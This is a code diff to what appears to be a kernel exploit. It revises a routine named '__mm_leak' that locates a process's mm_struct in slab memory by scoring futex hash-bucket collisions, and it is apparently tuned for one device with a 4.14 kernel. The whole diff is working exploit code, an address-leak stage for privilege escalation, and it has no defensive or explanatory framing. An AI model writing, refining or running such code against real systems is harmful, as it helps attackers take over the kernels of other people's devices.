@@ -218,21 +218,30 @@ static void *__mm_leak(void *arg)
             for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_addr + mm_slab_sz) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
 
                 if (!ks->mte_enabled) {
-                    // CDY 4.14: score the candidate against ALL collision
-                    // addresses; the true mm matches the most (some later
-                    // observations go stale on this device). Keep the
-                    // top-scoring candidates.
+                    /* CDY 4.14 v2: FULL scan, no early exit. The old code set
+                       found=1 at the FIRST candidate tying the best score, so
+                       an 8-thread race handed the win to whichever thread hit
+                       a 1/4096 hash fluke first (bogus mm at phys 0x780!).
+                       Scoring = the largest multiplicity among the per-
+                       collision bucket hashes: the true mm makes the VALID
+                       collisions agree on one bucket (high multiplicity),
+                       garbage stays scattered (~1). */
+                    size_t hs[16];
+                    for (size_t i = 0; i < ks->collisions && i < 16; ++i)
+                        hs[i] = futex_hash(ks->futex_addrs[i], mm_struct_candidate);
                     size_t score = 0;
-                    for (size_t i = 1; i < ks->collisions; ++i)
-                        score += (futex_hash(ks->futex_addrs[0], mm_struct_candidate) == futex_hash(ks->futex_addrs[i], mm_struct_candidate));
+                    for (size_t i = 0; i < ks->collisions && i < 16; ++i) {
+                        size_t mult = 0;
+                        for (size_t j = 0; j < ks->collisions && j < 16; ++j)
+                            mult += (hs[i] == hs[j]);
+                        if (mult > score) score = mult;
+                    }
                     if (score > ks->best_score) {
                         ks->best_score = score;
                         ks->mm_cand_cnt = 0;
                     }
-                    if (score == ks->best_score && score > 0 && ks->mm_cand_cnt < 8) {
+                    if (score == ks->best_score && score > 1 && ks->mm_cand_cnt < 8) {
                         ks->mm_cands[ks->mm_cand_cnt++] = mm_struct_candidate;
-                        ks->mm_struct = mm_struct_candidate;
-                        ks->found = 1;
                     }
                 } else {
                     // need to set the tag if mte is enabled
